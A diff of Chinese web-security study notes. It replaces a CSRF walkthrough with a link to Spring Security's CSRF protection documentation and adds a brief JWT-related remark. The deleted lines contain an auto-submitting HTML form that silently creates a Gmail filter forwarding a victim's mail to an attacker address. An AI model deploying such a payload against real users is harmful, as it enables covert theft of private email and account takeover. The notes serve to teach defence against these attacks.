@@ -237,28 +237,7 @@ a.com以受害者的名义执行了act=xx。
 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作。
 ```
 
-举个简单的例子：
-
-这一天，小明同学百无聊赖地刷着Gmail邮件。大部分都是没营养的通知、验证码、聊天记录之类。但有一封邮件引起了小明的注意：[甩卖比特币，一个只要998！！], 小明当然知道这种肯定是骗子，但还是抱着好奇的态度点了进去。果然，这只是一个什么都没有的空白页面，小明失望的关闭了页面。一切似乎什么都没有发生……但小明的Gmail中，被偷偷设置了一个过滤规则，这个规则使得所有的邮件都会被自动转发到黑客的邮箱。
-
-```
-<form method="POST" action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf" enctype="multipart/form-data"> 
-    <input type="hidden" name="cf2_emc" value="true"/> 
-    <input type="hidden" name="cf2_email" value="hacker@hakermail.com"/> 
-    .....
-    <input type="hidden" name="irf" value="on"/> 
-    <input type="hidden" name="nvp_bu_cftb" value="Create Filter"/> 
-</form> 
-<script> 
-    document.forms[0].submit();
-</script>
-```
-
-这个页面只要打开，就会向Gmail发送一个post请求。请求中，执行了“Create Filter”命令，将所有的邮件，转发到action指定的邮箱.  请求发送时，携带着小明的登录凭证（Cookie），Gmail的后台接收到请求，验证了确实有小明的登录凭证，于是成功给小明配置了过滤器。
-
-小明由于刚刚就登陆了Gmail，所以这个请求发送时，携带着小明的登录凭证（Cookie），Gmail的后台接收到请求，验证了确实有小明的登录凭证，于是成功给小明配置了过滤器。
-
-黑客可以查看小明的所有邮件，包括邮件里的域名验证码等隐私信息。拿到验证码之后，黑客就可以要求域名服务商把域名重置给自己.
+防止CSRF: https://docs.spring.io/spring-security/reference/features/exploits/csrf.html
 
 ## XSS
 
@@ -304,6 +283,8 @@ String str = HtmlUtils.htmlescape(str);
 
 
 ## JWT
+
+> 如果为每个请求验证用户名和密码会降低应用程序性能(比如单向哈希密码比较), 使用短期凭证, 如session、 token等可解决此问题.
 
 **JWT(Json Web Token)**是一个经过加密的，包含用户信息的且具有时效性的固定格式字符串 
 
